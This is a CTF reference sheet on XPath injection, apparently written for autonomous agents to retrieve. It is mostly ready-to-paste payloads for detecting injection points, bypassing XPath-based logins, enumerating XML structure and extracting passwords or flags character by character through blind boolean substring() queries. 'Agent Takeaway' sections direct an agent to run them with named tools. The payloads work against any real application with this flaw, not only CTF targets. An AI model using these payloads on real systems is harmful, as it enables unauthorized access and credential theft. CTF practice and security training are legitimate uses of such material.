# XPath Injection - CTF Exploitation Reference

> **Document Purpose:** Actionable XPath injection techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, detection indicators, and blind extraction methodology.

---

## 1. QUICK REFERENCE: XPath Injection Detection

> **When to use this section:** You suspect the backend uses XML/XPath for authentication or data retrieval and want to test for injection.

### 1.1 Detection Indicators

**Tags:** `xpath, injection, detection, indicators`

Look for these signs that XPath injection may be possible:

- Login forms or search forms backed by XML data stores
- Error messages mentioning: `XPath`, `XPATH`, `lxml`, `SimpleXML`, `DOMXPath`, `XPathException`
- XML-based APIs or SOAP endpoints
- Responses that change when single quotes `'` are injected
- Applications that don't use a traditional SQL database

### 1.2 Basic XPath Injection Test Payloads

**Tags:** `xpath, injection, probe, test-payloads`

Inject these into form fields to detect XPath injection. Compare responses between true and false conditions.

**True Condition Payloads (should succeed/show data):**
```
' or '1'='1
' or ''='
1 or 1=1
' or 1=1 or '1'='1
' or 'a'='a
```

**False Condition Payloads (should fail/show nothing):**
```
' and '1'='2
' or '1'='2
' and 'a'='b
1 and 1=2
```

**Key Test:** If `' or '1'='1` and `' and '1'='2` produce DIFFERENT responses, XPath injection is confirmed.

---

## 2. Authentication Bypass

> **When to use this section:** You have a login form and suspect XPath-based authentication.

### 2.1 Auth Bypass Payloads

**Tags:** `xpath, auth-bypass, login-bypass, authentication, payloads`

**Primary Payloads (try in username field first):**
```
' or '1'='1
' or ''='
admin' or '1'='1
' or 1=1 or '1'='1
') or ('1'='1
```

**Secondary Payloads (if primary fails):**
```
' or 1=1]%00
' or 1=1]//*
admin']//*[contains(.,'
' or substring(name(/*[1]),1,1)='a' or '1'='1
```

**Password Field Payloads:**
```
' or '1'='1
anything' or '1'='1
' or 1=1 or '
```

**Expected Success Indicators:**
- Login succeeds (redirect to dashboard/admin)
- Response contains user data or session token
- Different response than with normal failed login

---

## 3. Blind Boolean XPath Extraction

> **When to use this section:** XPath injection is confirmed but no data is directly reflected. Extract data character-by-character.

### 3.1 The substring() Technique

**Tags:** `xpath, blind, boolean, extraction, substring`

XPath's `substring()` function extracts individual characters for boolean-based blind extraction:

```
substring(string, position, length)
```

**Step-by-step blind extraction:**

1. **Determine string length:**
```
' or string-length(//user[1]/password)=1 or '1'='2
' or string-length(//user[1]/password)=2 or '1'='2
...continue until response changes...
```

2. **Extract characters one by one:**
```
' or substring(//user[1]/password,1,1)='a' or '1'='2
' or substring(//user[1]/password,1,1)='b' or '1'='2
...try each character...
```

3. **Binary search optimization (faster):**
```
' or substring(//user[1]/password,1,1)>'m' or '1'='2
```
If TRUE: character is n-z. If FALSE: character is a-m. Continue halving.

### 3.2 Common XPath Expressions for Extraction

**Tags:** `xpath, extraction, expressions, paths`

```
//user[1]/password          - First user's password
//user[1]/username          - First user's username
//user[position()=1]/pass   - Alternative syntax
//credentials/user[1]/flag  - Flag field
//*[contains(.,'flag')]     - Any element containing 'flag'
name(/*[1])                 - Root element name
name(/*[1]/*[1])            - First child element name
count(//user)               - Number of user elements
```

---

## 4. Inverted Oracle Detection

> **When to use this section:** Your blind extraction is giving wrong results because the boolean oracle is inverted.

### 4.1 What is an Inverted Oracle?

**Tags:** `xpath, blind, inverted-oracle, troubleshooting`

An **inverted oracle** occurs when the application's response to a TRUE condition looks like a failure, and the response to a FALSE condition looks like success. This is common in CTF challenges.

**Example:** The response "You're on the right path" appears when the condition is FALSE, not TRUE.

### 4.2 How to Detect Inversion

**Tags:** `xpath, inverted-oracle, detection, calibration`

1. Send a **known-true** condition: `' or '1'='1`
2. Send a **known-false** condition: `' and '1'='2`
3. Note which response matches which baseline:
   - If TRUE condition gets the "failure" response → **oracle is inverted**
   - If TRUE condition gets the "success" response → oracle is normal

4. **Fix:** Swap your TRUE/FALSE comparison logic. When extracting characters:
   - Normal: response matches TRUE baseline → character comparison is correct
   - Inverted: response matches FALSE baseline → character comparison is correct

### 4.3 Calibration Payloads

```
Known TRUE:   ' or '1'='1' or '1'='1
Known FALSE:  ' and '1'='2' and '1'='2
```

**Agent Takeaway:**
- ALWAYS calibrate the oracle before starting blind extraction
- Send known-true and known-false conditions first
- If results seem wrong, try inverting your comparison logic
- The `xpath_blind_boolean` tool has a `detect_inversion` flag for automatic detection

---

## 5. XPath Enumeration

> **When to use this section:** You want to discover the XML structure before extracting specific data.

### 5.1 Structure Discovery Payloads

**Tags:** `xpath, enumeration, structure, discovery`

**Count elements:**
```
' or count(//*)>0 or '1'='2      - Total element count
' or count(//user)>0 or '1'='2   - User element count
' or count(/*[1]/*)>5 or '1'='2  - Root children count
```

**Discover element names:**
```
' or substring(name(/*[1]),1,1)='a' or '1'='2   - Root element first char
' or name(/*[1])='users' or '1'='2              - Test root name
' or name(/*[1]/*[1])='user' or '1'='2          - Test child name
```

**Check for specific elements:**
```
' or //flag or '1'='2
' or //password or '1'='2
' or //secret or '1'='2
' or //*[contains(name(),'flag')] or '1'='2
```

**Agent Takeaway:**
- Use `xpath_probe` to detect XPath injection points
- Use `xpath_blind_boolean` with `detect_inversion: true` for blind extraction
- Use `xpath_payload_generator` to get ready-made payloads
- Always calibrate the oracle before blind extraction
- Common extraction targets: `//user[1]/password`, `//flag`, `//secret`
